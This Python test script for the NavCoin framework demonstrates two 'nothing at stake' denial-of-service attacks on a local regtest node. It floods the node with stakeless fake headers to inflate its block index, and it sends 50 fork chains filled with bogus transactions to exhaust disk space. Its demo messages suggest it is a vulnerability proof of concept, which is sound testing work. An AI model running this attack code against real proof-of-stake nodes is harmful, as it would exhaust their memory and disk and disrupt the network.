#!/usr/bin/env python3

from test_framework.bignum import *
from test_framework.blocktools import *
from test_framework.key import *
from test_framework.mininode import *
from test_framework.script import *
from test_framework.test_framework import NavCoinTestFramework
from test_framework.util import *
import time
import json

import subprocess
_compactblocks = __import__('p2p-acceptblock')
TestNode = _compactblocks.TestNode

def print_dir_size(path):
    size = subprocess.check_output(['du','-sh', path]).split()[0].decode('utf-8')
    print("blocks directory size: " + size)

#DISK ATTACK CONSTANTS
NUM_FORKS = 50
CHAIN_SIZE = 20
NUM_TRANSACTIONS_IN_BLOCK = 2000


class NothingAtStakeDoSTest(NavCoinTestFramework):

    def create_block_header(self, hashPrevBlock, nTime, hashMerkleRoot):
        block = CBlockHeader()
        block.nTime = nTime
        block.hashPrevBlock = hashPrevBlock
        block.nBits = 0x4d00ffff  # Will break after a difficulty adjustment...
        block.hashMerkleRoot = hashMerkleRoot
        block.prevoutStake = COutPoint(0xff, 0xffffffff)
        block.vchBlockSig = b"x" * 1024
        block.calc_sha256()
        # print(block)
        return block

    def nothing_at_stake_headers(self):
        MAX_HEADERS = 15  # Really 2000 but this is easier
        ITERATIONS = 100

        block_count = self.node.getblockcount()
        pastBlockHash = self.node.getblockhash(block_count - MAX_HEADERS - 1)
        print("Initial mapBlockIndex-size:", self.node.getblockchaininfo()['mapBlockIndex-size'], "\n")
        print('Step 1 of 2: generating lots of headers with no stake\n\n')

        # In each iteration, send a `headers` message with the maximumal number of entries
        sent = 0
        for i in range(ITERATIONS):
            t = int(time.time() + 1)
            prevBlockHash = int(pastBlockHash, 16)
            blocks = []
            for b in range(MAX_HEADERS):
                t = t + 1
                block = self.create_block_header(prevBlockHash, nTime=t, hashMerkleRoot=i)
                prevBlockHash = int(block.hash, 16)
                blocks.append(block)

            msg = msg_headers()
            msg.headers.extend(blocks)
            sent += len(blocks)
            if i % 10 == 0:
                print("sent ",i*MAX_HEADERS , " headers out of", ITERATIONS*MAX_HEADERS, "total headers")
            time.sleep(0.2)
            #print(msg.serialize())
            self.test_nodes[0].send_message(msg)

        time.sleep(2)
        print('\n\nStep 2 of 2: checking how many headers were stored')
        print('Number of headers sent:', sent)
        print('Please note the value of mapBLockIndex-size in getblockchaininfo()', 
            "We have altered the getblockchaininfo() rpc to also print the mapBLockIndex-size for this demo\n\n")
        print("Final mapBlockIndex-size:", self.node.getblockchaininfo()['mapBlockIndex-size'])

    def set_test_params(self):
        self.setup_clean_chain = True
        self.num_nodes = 1

    def nothing_at_stake_disk(self):
        print("Starting disk Attack")
        print("Creating fork chains from past block")
        fork_chain_start_hash = int("0x" + self.node.getblockhash(0), 0)
        print("Inital size of data dir")
        print_dir_size(self.options.tmpdir+'/node0/regtest/blocks/')
        print('\n'*2)
        for fork_iter in range(NUM_FORKS):
            fork_blocks = []
            prev_hash = fork_chain_start_hash
            ntime = int(time.time()) + 1
            block = None
            # Build a fork with CHAIN_SIZE blocks
            for i in range(CHAIN_SIZE):
                block = create_block(prev_hash, create_coinbase(i+1, bytes(i)), ntime)
                if i > 0:
                # Most of the chain consists of bogus transactions
                    for j in range(NUM_TRANSACTIONS_IN_BLOCK):
                        tx = create_transaction(block.vtx[0], 0, b"1729", i*700 + j+ 123*fork_iter)
                        block.vtx.append(tx)
                block.hashMerkleRoot = block.calc_merkle_root()
                #block.solve()
                block.rehash()
                fork_blocks.append(block)
                ntime += 2
                prev_hash = block.sha256
            # By showing a header chain with greater height, the blocks are requested
            msg = msg_headers()
            msg.headers.extend([CBlockHeader(b) for b in fork_blocks])
            self.test_nodes[0].send_message(msg)
            # Once headers are broadcasted sent ALL the blocks. Sending 1 more will cause validation, one less will get
            # us banned
            for b in fork_blocks:
                self.test_nodes[0].send_message(msg_block(b))
            if fork_iter % 10 == 0:
                print(str(fork_iter) + " forks out of " + str(NUM_FORKS) + " forks stored in disk.", "Single Fork size =", 
                    CHAIN_SIZE, "blocks; Single block size =", len(block.serialize()))
        print("\n\nFinal size of data dir")
        print_dir_size(self.options.tmpdir+'/node0/regtest/blocks/')

    def run_test(self):
                # Setup the p2p connections and start up the network thread.
        # test_node interface connects to node
        print("Setting up network for the attacks")
        self.test_nodes = []
        self.test_nodes.append(TestNode())
        conn = NodeConn('127.0.0.1', p2p_port(0), self.nodes[0], self.test_nodes[0])
        self.test_nodes[0].add_connection(conn)

        logging.getLogger("TestFramework.mininode").setLevel(logging.ERROR)
        NetworkThread().start()  # Start up network handling in another thread
        self.test_nodes[0].wait_for_verack()

        self.node = self.nodes[0]
        self.node.generate(CHAIN_SIZE) # generate initial chain
        assert_equal(self.node.getblockcount(), CHAIN_SIZE)
        self.nothing_at_stake_headers()
        self.nothing_at_stake_disk()

if __name__ == '__main__':
    NothingAtStakeDoSTest().main()

